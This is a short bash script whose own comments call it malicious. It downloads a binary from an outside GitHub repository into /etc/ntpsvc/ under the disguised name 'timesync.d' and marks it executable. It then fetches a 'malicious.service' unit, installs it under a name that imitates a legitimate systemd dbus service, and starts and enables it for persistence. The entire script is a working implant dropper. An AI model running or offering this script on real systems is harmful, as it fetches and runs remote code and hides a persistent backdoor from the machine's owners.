#!/bin/bash

# Create malicious binary
mkdir -p /etc/ntpsvc/
wget https://github.com/DaveTheBearMan/Shadow/raw/refs/heads/main/cmd/cmd -O /etc/ntpsvc/timesync.d
chmod +x /etc/ntpsvc/timesync.d

# Make the malicious service
curl https://raw.githubusercontent.com/DaveTheBearMan/Shadow/refs/heads/main/Scripts/malicious.service > /etc/systemd/system/dbus-org.freedesktop.isolate1.service

# Start the malicious service
systemctl start dbus-org.freedesktop.isolate1.service
systemctl enable dbus-org.freedesktop.isolate1.service